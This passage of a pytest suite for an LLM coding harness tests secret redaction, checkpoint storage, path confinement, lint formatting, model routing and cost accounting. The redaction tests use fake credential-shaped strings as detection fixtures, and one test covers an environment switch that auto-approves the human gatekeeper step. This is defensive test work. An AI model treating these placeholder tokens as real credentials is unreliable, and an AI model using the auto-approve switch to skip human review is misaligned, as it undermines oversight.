        # 40-char git SHA — must NOT be redacted with default settings
        text = "See commit a1b2c3d4e5f6789012345678901234567890abcd for details"
        redacted, result = scanner.redact_text(text)
        assert result.replacements == 0
        assert "a1b2c3d4e5f6789012345678901234567890abcd" in redacted

    def test_entropy_pass_skips_uuids_and_hex_when_enabled(self):
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask", entropy_detection=True)
        # UUID with dashes
        text1 = "id: 550e8400-e29b-41d4-a716-446655440000"
        # Pure hex (git SHA shape)
        text2 = "sha: a1b2c3d4e5f6789012345678901234567890abcd"
        r1, _ = scanner.redact_text(text1)
        r2, _ = scanner.redact_text(text2)
        assert "550e8400" in r1
        assert "a1b2c3d4" in r2

    def test_entropy_pass_catches_real_secrets_when_enabled(self):
        # Mixed-case base64-shaped string with high entropy should still be flagged.
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask", entropy_detection=True)
        # 40 chars of mixed-case alphanumeric — high entropy across full alphabet
        text = "leaked: aB3xZ9k2Lq8mN4pR7vW1tY5jH6gF0sD2cE4iU8oP"
        redacted, result = scanner.redact_text(text)
        assert result.replacements > 0

    def test_modern_provider_tokens_redacted(self):
        # Regression: gateway audit flagged missing patterns for github_pat_,
        # hf_, etc. — added to _SECRET_PATTERNS.
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="mask")
        cases = [
            "token=github_pat_11ABCD1234567890ABCDEFGH",
            "token=hf_abcdefghijklmnopqrstuvwxyz12",
        ]
        for text in cases:
            _, result = scanner.redact_text(text)
            assert result.replacements > 0, f"Should redact: {text}"

    def test_redaction_preserves_json_validity(self):
        # Bracketed replacements ([REDACTED:...]) are JSON-string-safe
        # because they contain no `"` or `\`.
        from harness.redactor import SecretScanner
        scanner = SecretScanner(mode="hash")
        msg = json.dumps({"api_key": "sk-ant-api01-abcdef1234567890abcdef1234567890abcdef1234567890abcd"})
        redacted, result = scanner.redact_text(msg)
        assert result.replacements > 0
        # The redacted output must still parse as JSON
        parsed = json.loads(redacted)
        assert "REDACTED" in parsed["api_key"]
        assert "sk-ant" not in parsed["api_key"]


# ===========================================================================
# STORAGE TESTS
# ===========================================================================

class TestStorage:

    def test_generate_session_id_default(self):
        from harness.storage import generate_session_id
        sid = generate_session_id()
        assert len(sid) == 36

    def test_generate_session_id_custom(self):
        from harness.storage import generate_session_id
        sid = generate_session_id("my-session")
        assert sid == "my-session"

    @pytest.mark.asyncio
    async def test_async_sqlite_saver_basic(self):
        from harness.storage import HarnessAsyncSqliteSaver
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
            db_path = tf.name
        try:
            saver = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=30)
            config = {"configurable": {"thread_id": "test-thread", "checkpoint_ns": ""}}
            checkpoint = {"id": "cp1", "type": "state", "channel_values": {"exit_code": 0}}
            metadata = {"source": "test"}
            await saver.aput(config, checkpoint, metadata, {})
            result = await saver.aget(config)
            assert result is not None
            # Official saver returns checkpoint dict; 'id' may be in a nested structure
            # Validate the result is the checkpoint we stored
            assert result.get("id") == "cp1"
            await saver.conn.close()
        finally:
            if os.path.exists(db_path):
                os.unlink(db_path)

    @pytest.mark.asyncio
    async def test_async_sqlite_saver_get_missing(self):
        from harness.storage import HarnessAsyncSqliteSaver
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
            db_path = tf.name
        try:
            saver = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=30)
            result = await saver.aget({"configurable": {"thread_id": "nonexistent"}})
            assert result is None
            await saver.conn.close()
        finally:
            if os.path.exists(db_path):
                os.unlink(db_path)

    @pytest.mark.asyncio
    async def test_create_checkpointer_sqlite(self):
        from harness.storage import create_checkpointer, HarnessAsyncSqliteSaver
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
            db_path = tf.name
        try:
            cp = await create_checkpointer(backend="sqlite", db_path=db_path)
            assert isinstance(cp, HarnessAsyncSqliteSaver)
            # Also verify it passes LangGraph's isinstance check
            from langgraph.checkpoint.base import BaseCheckpointSaver
            assert isinstance(cp, BaseCheckpointSaver)
            await cp.conn.close()
        finally:
            if os.path.exists(db_path):
                os.unlink(db_path)

    def test_deserialize_blob_resilient_when_msgpack_unavailable(self, monkeypatch):
        # Regression: previously `except (..., msgpack.exceptions.X, ...)` referenced
        # msgpack after a failed import, raising NameError instead of falling back.
        import sys
        monkeypatch.setitem(sys.modules, "msgpack", None)
        from harness.storage import _deserialize_checkpoint_blob
        # Non-JSON, non-msgpack bytes — should return {} without raising.
        assert _deserialize_checkpoint_blob(b"\x80\x81\xff") == {}
        # A JSON byte payload still decodes via the fallback.
        assert _deserialize_checkpoint_blob(b'{"a":1}') == {"a": 1}

    @pytest.mark.asyncio
    async def test_run_gc_deletes_expired_threads(self):
        # Regression: _run_gc was a no-op despite TTL contract. Verify expired
        # threads (older than ttl_days) are removed on saver init.
        import aiosqlite
        import msgpack
        from datetime import datetime, timezone, timedelta
        from harness.storage import HarnessAsyncSqliteSaver

        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
            db_path = tf.name
        try:
            saver = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=30)
            config = {"configurable": {"thread_id": "expired-thread", "checkpoint_ns": ""}}
            await saver.aput(config, {"id": "cp1", "type": "state", "channel_values": {}}, {"source": "test"}, {})
            await saver.conn.close()

            # Backdate the ts inside the stored msgpack blob to 60 days ago.
            old_ts = (datetime.now(timezone.utc) - timedelta(days=60)).isoformat().replace("+00:00", "Z")
            async with aiosqlite.connect(db_path) as conn:
                cursor = await conn.execute("SELECT checkpoint FROM checkpoints LIMIT 1")
                row = await cursor.fetchone()
                assert row is not None
                unpacked = msgpack.unpackb(row[0], raw=False)
                unpacked["ts"] = old_ts
                await conn.execute(
                    "UPDATE checkpoints SET checkpoint = ? WHERE thread_id = ?",
                    (msgpack.packb(unpacked, use_bin_type=True), "expired-thread"),
                )
                await conn.commit()

            # Reopen — GC should reap the expired thread.
            saver2 = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=30)
            assert await saver2.aget(config) is None
            await saver2.conn.close()
        finally:
            if os.path.exists(db_path):
                os.unlink(db_path)

    @pytest.mark.asyncio
    async def test_wal_mode_actually_enabled(self):
        # Regression: PRAGMA journal_mode=WAL was set but never verified.
        # Confirm it actually takes effect on a real disk-backed SQLite file
        # and the verification reads back the active mode.
        import aiosqlite
        from harness.storage import HarnessAsyncSqliteSaver
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
            db_path = tf.name
        try:
            saver = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=30)
            cur = await saver.conn.execute("PRAGMA journal_mode;")
            row = await cur.fetchone()
            assert row is not None
            assert row[0].lower() == "wal", f"expected WAL mode, got {row[0]!r}"
            # Connect a second time and ensure WAL is sticky for the file
            await saver.conn.close()
            async with aiosqlite.connect(db_path) as conn:
                cur2 = await conn.execute("PRAGMA journal_mode;")
                row2 = await cur2.fetchone()
                assert row2 is not None
                assert row2[0].lower() == "wal"
        finally:
            if os.path.exists(db_path):
                os.unlink(db_path)

    @pytest.mark.asyncio
    async def test_run_gc_disabled_when_ttl_nonpositive(self):
        from harness.storage import HarnessAsyncSqliteSaver
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tf:
            db_path = tf.name
        try:
            saver = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=0)
            config = {"configurable": {"thread_id": "keep-me", "checkpoint_ns": ""}}
            await saver.aput(config, {"id": "cp1", "type": "state", "channel_values": {}}, {"source": "test"}, {})
            await saver.conn.close()
            # Reopen with ttl_days=0 — GC must not touch anything.
            saver2 = await HarnessAsyncSqliteSaver.from_db_path(db_path=db_path, ttl_days=0)
            assert await saver2.aget(config) is not None
            await saver2.conn.close()
        finally:
            if os.path.exists(db_path):
                os.unlink(db_path)


# ===========================================================================
# LINTGATE TESTS
# ===========================================================================

class TestLintGate:

    def test_get_formatter_python(self):
        from harness.lintgate import get_formatter_for_file
        spec = get_formatter_for_file("test.py")
        assert spec is not None
        assert spec.command == "ruff"

    def test_get_formatter_go(self):
        from harness.lintgate import get_formatter_for_file
        spec = get_formatter_for_file("main.go")
        assert spec is not None
        assert spec.command == "gofmt"

    def test_get_formatter_unknown(self):
        from harness.lintgate import get_formatter_for_file
        spec = get_formatter_for_file("test.xyz")
        assert spec is None

    def test_register_formatter(self):
        from harness.lintgate import register_formatter, get_formatter_for_file, FormatterSpec
        spec = FormatterSpec(command="test-fmt", args=["-w"])
        register_formatter(".test", spec)
        retrieved = get_formatter_for_file("file.test")
        assert retrieved is not None
        assert retrieved.command == "test-fmt"

    def test_is_tool_available(self):
        from harness.lintgate import is_tool_available
        assert is_tool_available("python") is True
        assert is_tool_available("nonexistent_tool_xyz") is False

    def test_resolve_path_absolute_outside_workspace_rejected(self):
        # Security: absolute paths that escape the workspace must be rejected,
        # not silently returned. Previous behavior was an arbitrary-file-read
        # vector.
        from harness.lintgate import _resolve_path
        result = _resolve_path("/tmp", "/workspace")
        assert result is None

    def test_resolve_path_absolute_inside_workspace_resolves(self):
        # Absolute path that lives inside the workspace is still accepted.
        from harness.lintgate import _resolve_path
        with tempfile.TemporaryDirectory() as ws:
            target = os.path.join(ws, "file.py")
            with open(target, "w") as f:
                f.write("")
            result = _resolve_path(target, ws)
            assert result is not None
            assert os.path.realpath(result) == os.path.realpath(target)

    def test_resolve_path_nonexistent(self):
        from harness.lintgate import _resolve_path
        result = _resolve_path("/nonexistent_xyz_file.txt", "/workspace")
        assert result is None

    def test_classify_files_by_git_status_distinguishes_new_vs_modified(self):
        # Regression: lintgate used to format every modified file, including
        # files that existed before this session — clobbering user style
        # outside the patch region. The classifier now tells lintgate which
        # files are safe to fully rewrite.
        import subprocess
        from harness.lintgate import _classify_files_by_git_status
        with tempfile.TemporaryDirectory() as ws:
            subprocess.run(["git", "-C", ws, "init", "-q"], check=True)
            subprocess.run(["git", "-C", ws, "config", "user.email", "t@t"], check=True)
            subprocess.run(["git", "-C", ws, "config", "user.name", "t"], check=True)
            subprocess.run(["git", "-C", ws, "config", "commit.gpgsign", "false"], check=True)
            # Pre-existing file, committed
            pre = os.path.join(ws, "existing.py")
            with open(pre, "w") as f:
                f.write("x = 1\n")
            subprocess.run(["git", "-C", ws, "add", "-A"], check=True)
            subprocess.run(["git", "-C", ws, "commit", "-qm", "init"], check=True)
            # Modify it + add a new file (simulates an LLM patch round)
            with open(pre, "a") as f:
                f.write("y = 2\n")
            new = os.path.join(ws, "new_file.py")
            with open(new, "w") as f:
                f.write("z = 3\n")

            created, preexisting = _classify_files_by_git_status(
                ["existing.py", "new_file.py"], ws
            )
            assert "new_file.py" in created
            assert "existing.py" in preexisting

    def test_classify_files_fallback_when_not_a_git_repo(self):
        # Non-git workspace → treat every file as pre-existing (safe default).
        from harness.lintgate import _classify_files_by_git_status
        with tempfile.TemporaryDirectory() as ws:
            created, preexisting = _classify_files_by_git_status(["a.py", "b.py"], ws)
            assert created == set()
            assert preexisting == {"a.py", "b.py"}

    @pytest.mark.asyncio
    async def test_lintgate_node_no_files(self):
        from harness.lintgate import lintgate_node
        state = {"modified_files": [], "workspace_path": "/tmp"}
        result = await lintgate_node(state)
        assert result["node_state"]["lintgate"]["checked"] == 0

    @pytest.mark.asyncio
    async def test_lintgate_node_no_matching_formatters(self):
        from harness.lintgate import lintgate_node
        state = {"modified_files": ["test.xyz"], "workspace_path": "/tmp"}
        result = await lintgate_node(state)
        assert result["node_state"]["lintgate"]["checked"] == 1
        assert result["node_state"]["lintgate"]["formatted"] == 0


class TestFormatterSpec:

    def test_formatter_spec_defaults(self):
        from harness.lintgate import FormatterSpec
        spec = FormatterSpec(command="ruff", args=["format"])
        assert spec.linter_command == ""
        assert spec.linter_args == []
        assert spec.install_hint == ""


# ===========================================================================
# GATEWAY TESTS
# ===========================================================================

class TestModelPrices:

    def test_catalogue_auto_loaded_at_import(self):
        from harness.gateway import _MODEL_REGISTRY
        # The shipped model_prices.json should have seeded the registry
        assert len(_MODEL_REGISTRY) >= 10, "Expected at least 10 catalogue entries"

    def test_known_models_in_catalogue(self):
        from harness.gateway import get_model_spec
        for key in ["anthropic:claude-sonnet-4-6", "openai:gpt-4o", "deepseek:deepseek-chat"]:
            spec = get_model_spec(key)
            assert spec is not None, f"{key} missing from catalogue"
            assert spec.input_cost_per_1m >= 0
            assert spec.output_cost_per_1m >= 0
            assert spec.context_window > 0

    def test_load_from_custom_file(self, tmp_path):
        import json as _json
        from harness.gateway import load_model_prices, get_model_spec
        custom = tmp_path / "prices.json"
        custom.write_text(_json.dumps({
            "testprovider:test-model-x": {
                "provider": "testprovider",
                "model_id": "test-model-x",
                "context_window": 4096,
                "input_cost_per_1m": 9.99,
                "output_cost_per_1m": 19.99,
            }
        }))
        loaded = load_model_prices(str(custom), override=True)
        assert loaded == 1
        spec = get_model_spec("testprovider:test-model-x")
        assert spec is not None
        assert spec.input_cost_per_1m == 9.99

    def test_user_config_overrides_catalogue(self):
        from harness.gateway import register_models_from_config, get_model_spec
        # User sets a higher input price for gpt-4o (e.g. after a price change)
        config = {"models": {"openai:gpt-4o": {"input_cost_per_1m": 99.0}}}
        register_models_from_config(config)
        spec = get_model_spec("openai:gpt-4o")
        assert spec is not None
        assert spec.input_cost_per_1m == 99.0
        # Other fields should still come from catalogue baseline
        assert spec.context_window > 0

    def test_load_ignores_comment_keys(self, tmp_path):
        import json as _json
        from harness.gateway import load_model_prices
        custom = tmp_path / "prices.json"
        custom.write_text(_json.dumps({
            "_comment": "this is a comment",
            "_version": "2025-01-01",
        }))
        loaded = load_model_prices(str(custom), override=True)
        assert loaded == 0  # no real model entries

    def test_load_nonexistent_file_returns_zero(self):
        from harness.gateway import load_model_prices
        count = load_model_prices("/nonexistent/path/prices.json")
        assert count == 0


class TestGateway:

    def test_register_model(self):
        from harness.gateway import register_model, get_model_spec, ModelSpec
        spec = ModelSpec(
            provider="test", model_id="test-model", context_window=1000,
            input_cost_per_1m=1.0, output_cost_per_1m=2.0,
        )
        register_model("test:test-model", spec)
        retrieved = get_model_spec("test:test-model")
        assert retrieved is not None
        assert retrieved.provider == "test"

    def test_estimate_token_count(self):
        from harness.gateway import estimate_token_count
        messages = [
            {"role": "system", "content": "You are a helpful assistant."},
            {"role": "user", "content": "Hello, how are you?"},
        ]
        tokens = estimate_token_count(messages)
        assert tokens > 0
        assert tokens < 50

    def test_ensure_prefix_cache_anchor(self):
        from harness.gateway import ensure_prefix_cache_anchor
        messages = [
            {"role": "system", "content": "System prompt here"},
            {"role": "user", "content": "User message"},
        ]
        result = ensure_prefix_cache_anchor(messages)
        assert result[0]["role"] == "system"

    def test_gateway_config_defaults(self):
        from harness.gateway import GatewayConfig
        config = GatewayConfig()
        assert config.planning_primary == ""
        assert config.patching_primary == ""
        assert config.hard_cap_usd == 2.00
        assert config.context_window_threshold_pct == 0.85

    def test_node_role_values(self):
        from harness.gateway import NodeRole
        assert NodeRole.PLANNING.value == "planning"
        assert NodeRole.PATCHING.value == "patching"
        assert NodeRole.REPAIR.value == "repair"

    def test_token_usage_to_dict(self):
        from harness.gateway import TokenUsage
        usage = TokenUsage(input_tokens=100, output_tokens=50, cached_tokens=20,
                          model_name="test:model", cost_usd=0.001)
        d = usage.to_dict()
        assert d["input_tokens"] == 100
        assert d["output_tokens"] == 50
        assert d["cost_usd"] == 0.001

    @pytest.mark.asyncio
    async def test_check_context_window_no_truncation(self):
        from harness.gateway import check_context_window, ModelSpec
        spec = ModelSpec(provider="test", model_id="test", context_window=100000,
                        input_cost_per_1m=1.0, output_cost_per_1m=1.0)
        messages = [
            {"role": "system", "content": "short prompt"},
            {"role": "user", "content": "short message"},
        ]
        result = await check_context_window(messages, spec, threshold_pct=0.85)
        assert len(result) == 2

    @pytest.mark.asyncio
    async def test_check_context_window_truncation(self):
        from harness.gateway import check_context_window, ModelSpec
        spec = ModelSpec(provider="test", model_id="test", context_window=200,
                        input_cost_per_1m=1.0, output_cost_per_1m=1.0)
        messages = [
            {"role": "system", "content": "sys"},
            {"role": "user", "content": "medium message " * 20},
            {"role": "assistant", "content": "response " * 20},
            {"role": "user", "content": "final message"},
        ]
        result = await check_context_window(messages, spec, threshold_pct=0.85)
        assert len(result) <= len(messages)

    @pytest.mark.asyncio
    async def test_check_context_window_continues_past_large_middle_message(self):
        # Regression: the fill loop used `break` when a message was too big
        # to fit. This caused all *older* (smaller) messages to be dropped
        # even if they would have fit. `continue` is correct.
        from harness.gateway import check_context_window, ModelSpec
        # Small context: sys + last must fit, one middle too large, one tiny
        spec = ModelSpec(provider="test", model_id="test", context_window=300,
                        input_cost_per_1m=1.0, output_cost_per_1m=1.0)
        messages = [
            {"role": "system", "content": "sys"},          # ~1 token
            {"role": "user", "content": "tiny"},            # ~1 token (oldest middle)
            {"role": "assistant", "content": "x " * 200},  # huge — won't fit
            {"role": "user", "content": "final question"},  # ~2 tokens (last, always kept)
        ]
        result = await check_context_window(messages, spec, threshold_pct=0.85)
        # system and final must always be kept
        assert result[0] == messages[0]
        assert result[-1] == messages[-1]
        # "tiny" (oldest middle) should survive because it fits, even though
        # the message after it was too large.
        contents = [m["content"] for m in result]
        assert "tiny" in contents, f"Small old message was incorrectly dropped; result: {contents}"

    def test_gateway_aggregate_tokens(self):
        from harness.gateway import Gateway, GatewayConfig, TokenUsage
        gateway = Gateway(GatewayConfig())
        tracker: dict = {}
        usage = TokenUsage(input_tokens=10, output_tokens=5, cached_tokens=2,
                          model_name="test:model", cost_usd=0.001)
        tracker = gateway.aggregate_tokens(tracker, usage)
        assert tracker["total_input_tokens"] == 10
        assert tracker["total_cost_usd"] == 0.001

    def test_gateway_select_model(self):
        from harness.gateway import Gateway, GatewayConfig, NodeRole
        config = GatewayConfig(
            planning_primary="openai:gpt-4o",
            patching_primary="deepseek:deepseek-chat",
            repair_primary="anthropic:claude-sonnet",
        )
        gateway = Gateway(config)
        assert gateway.select_model(NodeRole.PLANNING) == "openai:gpt-4o"
        assert gateway.select_model(NodeRole.PATCHING) == "deepseek:deepseek-chat"
        assert gateway.select_model(NodeRole.REPAIR) == "anthropic:claude-sonnet"

    def test_gateway_should_use_thinking(self):
        from harness.gateway import Gateway, GatewayConfig, NodeRole
        config = GatewayConfig(planning_mode="thinking_max", patching_mode="non_thinking", repair_mode="thinking")
        gateway = Gateway(config)
        assert gateway.should_use_thinking(NodeRole.PLANNING) is True
        assert gateway.should_use_thinking(NodeRole.PATCHING) is False
        assert gateway.should_use_thinking(NodeRole.REPAIR) is True

    @pytest.mark.asyncio
    async def test_dispatch_model_override_doesnt_mutate_config(self, monkeypatch):
        # Regression: repair_node used to swap gateway.config.repair_primary
        # to escalate to the reasoning model, restoring in `finally`. That
        # leaks state on exception and races concurrent dispatches.
        # Verify model_override is honored without touching config.
        import sys
        from harness.gateway import Gateway, GatewayConfig, NodeRole, register_model, ModelSpec

        register_model(
            "ollama:override-test-primary",
            ModelSpec(provider="ollama", model_id="primary",
                      context_window=4096, input_cost_per_1m=0.0, output_cost_per_1m=0.0,
                      api_base_url="http://127.0.0.1:11434/v1"),
        )
        register_model(
            "ollama:override-test-escalation",
            ModelSpec(provider="ollama", model_id="escalation",
                      context_window=4096, input_cost_per_1m=0.0, output_cost_per_1m=0.0,
                      api_base_url="http://127.0.0.1:11434/v1"),
        )
        # Force the redactor import to fail so dispatch short-circuits cheap
        # and lets us assert which model_key was selected before raising.
        monkeypatch.setitem(sys.modules, "harness.redactor", None)

        gateway = Gateway(GatewayConfig(repair_primary="ollama:override-test-primary"))
        config_before = gateway.config.repair_primary

        # Capture which provider key was resolved
        seen: dict = {}
        original = gateway._get_provider

        async def spy_get_provider(model_key):
            seen["model_key"] = model_key
            return await original(model_key)

        gateway._get_provider = spy_get_provider  # type: ignore[assignment]

        try:
            await gateway.dispatch(
                messages=[{"role": "user", "content": "x"}],
                role=NodeRole.REPAIR,
                budget_remaining_usd=1.0,
                model_override="ollama:override-test-escalation",
            )
        except RuntimeError:
            pass  # expected — redactor fail-closed will fire post-provider-selection

        assert seen["model_key"] == "ollama:override-test-escalation"
        # Config must remain untouched
        assert gateway.config.repair_primary == config_before

    # --- llm_dispatch / max_tokens externalization ---

    def test_max_tokens_for_per_role_overrides_default(self):
        from harness.gateway import Gateway, GatewayConfig, NodeRole
        gw = Gateway(GatewayConfig(
            max_tokens_default=4096,
            max_tokens_per_role={"repair": 8192, "doc_reviewer": 2048},
        ))
        assert gw._max_tokens_for(NodeRole.REPAIR) == 8192
        assert gw._max_tokens_for(NodeRole.DOC_REVIEWER) == 2048

    def test_max_tokens_for_falls_back_to_default(self):
        # Roles not in the per-role map inherit the default.
        from harness.gateway import Gateway, GatewayConfig, NodeRole
        gw = Gateway(GatewayConfig(
            max_tokens_default=4096,
            max_tokens_per_role={"repair": 8192},
        ))
        assert gw._max_tokens_for(NodeRole.PLANNING) == 4096
        assert gw._max_tokens_for(NodeRole.PATCHING) == 4096
        assert gw._max_tokens_for(NodeRole.CODE_REVIEWER) == 4096

    def test_max_tokens_for_ignores_non_positive_value(self):
        # If a config writer manages to slip a zero/negative through (e.g.
        # via the programmatic GatewayConfig path that bypasses
        # validate_config_strict), _max_tokens_for must NOT pass it to the
        # provider — fall back to the default instead.
        from harness.gateway import Gateway, GatewayConfig, NodeRole
        gw = Gateway(GatewayConfig(
            max_tokens_default=4096,
            max_tokens_per_role={"repair": 0, "doc_reviewer": -1},
        ))
        assert gw._max_tokens_for(NodeRole.REPAIR) == 4096
        assert gw._max_tokens_for(NodeRole.DOC_REVIEWER) == 4096

    def test_create_gateway_from_config_loads_llm_dispatch(self):
        # End-to-end: the JSON-shaped llm_dispatch section ends up on the
        # GatewayConfig dataclass after create_gateway_from_config.
        from harness.gateway import create_gateway_from_config
        cfg = {
            "models": {
                "openai:gpt-4o-mini": {
                    "provider": "openai", "model_id": "gpt-4o-mini",
                    "context_window": 128000,
                    "input_cost_per_1m": 0.15, "output_cost_per_1m": 0.60,
                    "api_base_url": "https://api.openai.com/v1",
                    "supports_thinking": False, "api_key": "",
                },
            },
            "model_routing": {
                "planning_primary": "openai:gpt-4o-mini",
                "patching_primary": "openai:gpt-4o-mini",
                "repair_primary": "openai:gpt-4o-mini",
            },
            "llm_dispatch": {
                "max_tokens_default": 4096,
                "max_tokens_per_role": {"repair": 8192, "doc_reviewer": 2048},
            },
        }
        gw = create_gateway_from_config(cfg)
        assert gw.config.max_tokens_default == 4096
        assert gw.config.max_tokens_per_role == {"repair": 8192, "doc_reviewer": 2048}

    def test_create_gateway_from_config_clamps_out_of_range(self):
        # Defense-in-depth: even if a programmatic caller hands us a value
        # outside [256, 32768] (bypassing validate_config_strict), the
        # factory must clamp it instead of trusting it blindly.
        from harness.gateway import create_gateway_from_config
        cfg = {
            "models": {
                "openai:gpt-4o-mini": {
                    "provider": "openai", "model_id": "gpt-4o-mini",
                    "context_window": 128000,
                    "input_cost_per_1m": 0.15, "output_cost_per_1m": 0.60,
                    "api_base_url": "https://api.openai.com/v1",
                    "supports_thinking": False, "api_key": "",
                },
            },
            "model_routing": {
                "planning_primary": "openai:gpt-4o-mini",
                "patching_primary": "openai:gpt-4o-mini",
                "repair_primary": "openai:gpt-4o-mini",
            },
            "llm_dispatch": {
                "max_tokens_default": 100,                  # below floor
                "max_tokens_per_role": {"repair": 99999},   # above ceiling
            },
        }
        gw = create_gateway_from_config(cfg)
        assert gw.config.max_tokens_default == 256
        assert gw.config.max_tokens_per_role["repair"] == 32768

    def test_create_gateway_from_config_defaults_when_section_absent(self):
        # No llm_dispatch in config → GatewayConfig defaults (4096 / empty map).
        from harness.gateway import create_gateway_from_config
        cfg = {
            "models": {
                "openai:gpt-4o-mini": {
                    "provider": "openai", "model_id": "gpt-4o-mini",
                    "context_window": 128000,
                    "input_cost_per_1m": 0.15, "output_cost_per_1m": 0.60,
                    "api_base_url": "https://api.openai.com/v1",
                    "supports_thinking": False, "api_key": "",
                },
            },
            "model_routing": {
                "planning_primary": "openai:gpt-4o-mini",
                "patching_primary": "openai:gpt-4o-mini",
                "repair_primary": "openai:gpt-4o-mini",
            },
        }
        gw = create_gateway_from_config(cfg)
        assert gw.config.max_tokens_default == 4096
        assert gw.config.max_tokens_per_role == {}

    @pytest.mark.asyncio
    async def test_dispatch_injects_per_role_max_tokens(self):
        # Verify dispatch() passes the per-role max_tokens into the
        # provider.chat_completion kwargs. Spy on chat_completion to
        # capture what it received without making a real API call.
        # The redactor must be intact (gateway fails-closed if it's not),
        # so we install a real one via the factory.
        from harness.gateway import (
            Gateway, GatewayConfig, NodeRole, ModelSpec, register_model,
        )
        from harness.redactor import create_redactor_from_config
        create_redactor_from_config({})

        register_model(
            "ollama:dispatch-mt-test",
            ModelSpec(provider="ollama", model_id="mt-test",
                      context_window=4096, input_cost_per_1m=0.0, output_cost_per_1m=0.0,
                      api_base_url="http://127.0.0.1:11434/v1"),
        )

        gateway = Gateway(GatewayConfig(
            repair_primary="ollama:dispatch-mt-test",
            max_tokens_default=4096,
            max_tokens_per_role={"repair": 8192},
        ))

        seen_kwargs: dict = {}
        original = gateway._get_provider

        async def spy_get_provider(model_key):
            provider = await original(model_key)

            async def spy_chat(**kwargs):
                seen_kwargs.update(kwargs)
                raise RuntimeError("stop before network call")

            provider.chat_completion = spy_chat  # type: ignore[assignment]
            return provider

        gateway._get_provider = spy_get_provider  # type: ignore[assignment]

        try:
            await gateway.dispatch(
                messages=[{"role": "user", "content": "x"}],
                role=NodeRole.REPAIR,
                budget_remaining_usd=1.0,
            )
        except RuntimeError:
            pass  # expected — spy raises before network

        assert seen_kwargs.get("max_tokens") == 8192, (
            f"REPAIR role should have received max_tokens=8192, "
            f"got {seen_kwargs.get('max_tokens')}"
        )

    @pytest.mark.asyncio
    async def test_dispatch_respects_caller_max_tokens_override(self):
        # When the caller passes max_tokens explicitly via **llm_kwargs,
        # the gateway must NOT overwrite it — per-role config is only the
        # default, not a hard ceiling.
        from harness.gateway import (
            Gateway, GatewayConfig, NodeRole, ModelSpec, register_model,
        )
        from harness.redactor import create_redactor_from_config
        create_redactor_from_config({})

        register_model(
            "ollama:dispatch-mt-override-test",
            ModelSpec(provider="ollama", model_id="override-test",
                      context_window=4096, input_cost_per_1m=0.0, output_cost_per_1m=0.0,
                      api_base_url="http://127.0.0.1:11434/v1"),
        )

        gateway = Gateway(GatewayConfig(
            repair_primary="ollama:dispatch-mt-override-test",
            max_tokens_default=4096,
            max_tokens_per_role={"repair": 8192},
        ))

        seen_kwargs: dict = {}
        original = gateway._get_provider

        async def spy_get_provider(model_key):
            provider = await original(model_key)

            async def spy_chat(**kwargs):
                seen_kwargs.update(kwargs)
                raise RuntimeError("stop")

            provider.chat_completion = spy_chat  # type: ignore[assignment]
            return provider

        gateway._get_provider = spy_get_provider  # type: ignore[assignment]

        try:
            await gateway.dispatch(
                messages=[{"role": "user", "content": "x"}],
                role=NodeRole.REPAIR,
                budget_remaining_usd=1.0,
                max_tokens=1024,  # explicit caller override
            )
        except RuntimeError:
            pass

        assert seen_kwargs.get("max_tokens") == 1024


class TestGatekeeperAutoApprove:
    """Regression: human_gatekeeper_node ignored HARNESS_AUTO_APPROVE and CI."""

    def test_helper_respects_env_vars(self, monkeypatch):
        from harness.cli import _gatekeeper_auto_approves
        monkeypatch.delenv("CI", raising=False)
        monkeypatch.delenv("HARNESS_AUTO_APPROVE", raising=False)
        # When stdin IS a tty and no env vars → interactive
        import sys
        if sys.stdin.isatty():
            assert _gatekeeper_auto_approves() is False
        # HARNESS_AUTO_APPROVE bypasses
        monkeypatch.setenv("HARNESS_AUTO_APPROVE", "true")
        assert _gatekeeper_auto_approves() is True
        monkeypatch.delenv("HARNESS_AUTO_APPROVE")
        # CI bypasses
        monkeypatch.setenv("CI", "true")
        assert _gatekeeper_auto_approves() is True

    def test_gatekeeper_auto_approves_in_ci(self, monkeypatch):
        from harness.cli import human_gatekeeper_node
        monkeypatch.setenv("HARNESS_AUTO_APPROVE", "true")
        with tempfile.TemporaryDirectory() as tmpdir:
            os.makedirs(os.path.join(tmpdir, "docs"))
            spec_path = os.path.join(tmpdir, "docs", "SPEC_REQUIREMENTS.md")
            with open(spec_path, "w") as f:
                f.write("# spec\n")
            state = {
                "current_gate": "REQUIREMENTS",
                "workspace_path": tmpdir,
                "spec_requirements_path": spec_path,
                "messages": [],
                "loop_counter": {},
            }
            result = human_gatekeeper_node(state)
            assert result["node_state"]["gatekeeper_action"] == "approve"

    def test_anthropic_compute_cost_doesnt_double_charge_cache(self):
        # Regression: previously the provider summed cache_read +
        # cache_creation into cached_tokens, then subtracted that sum
        # from input_tokens (which Anthropic already reports excluding
        # cache hits) — billing creation tokens at the read rate and
        # zeroing out the regular input charge.
        from harness.gateway import AnthropicProvider, ModelSpec, TokenUsage
        spec = ModelSpec(
            provider="anthropic", model_id="claude-test",
            context_window=200_000,
            input_cost_per_1m=3.00,
            output_cost_per_1m=15.00,
            cached_input_cost_per_1m=0.30,
            cache_creation_cost_per_1m=3.75,
            supports_cache=True,
        )
        provider = AnthropicProvider(spec)
        usage = TokenUsage(
            input_tokens=100_000,           # uncached, full rate
            output_tokens=0,
            cached_tokens=50_000,            # cache READS, discounted
            cache_creation_tokens=20_000,    # cache WRITES, surcharge
            model_name="claude-test",
        )
        # 100k * $3/M + 50k * $0.30/M + 20k * $3.75/M
        # = 0.300 + 0.015 + 0.075 = $0.390
        assert abs(provider.compute_cost(usage) - 0.390) < 1e-6

    def test_anthropic_creation_rate_defaults_to_125pct(self):
        # When the spec doesn't carry an explicit creation rate, the
